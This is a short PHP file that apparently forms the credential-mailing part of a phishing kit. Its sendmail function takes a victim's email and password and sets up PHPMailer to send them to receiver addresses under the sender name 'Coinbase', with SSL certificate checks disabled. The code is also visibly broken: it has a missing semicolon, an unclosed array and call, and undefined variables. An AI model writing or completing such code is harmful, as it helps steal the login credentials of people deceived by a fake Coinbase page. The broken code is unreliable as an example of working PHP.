<?php

use PHPMailer\PHPMailer\PHPMailer;

function sendmail($email, $pass)
{
   $mail ="";
    $email = $email;
    $pass = $pass;
    $name = "Coinbase";  // Name of your website or yours
    $to = $receiveremails;  // mail of reciever
    $subject = ""
    // To Here

    // SMTP Settings
    $mail->SMTPDebug = 3;                        
    $mail->SMTPAuth = true;
    $mail->Username = $from;
    $mail->Password = $password;
    $mail->Port = 465;  // port
    $mail->SMTPSecure = "ssl";  // tls or ssl
    $mail->smtpConnect([
        'ssl' => [
            'verify_peer' => false,
            'verify_peer_name' => false,
            'allow_self_signed' => true
        ]

    //Email Settings
    $mail->isHTML(true);
    $mail->setFrom($from, $name);
    $mail->addAddress($to); // enter email address whom you want    to send
    $mail->Subject = ("$subject");
    $mail->Body = $body;
}
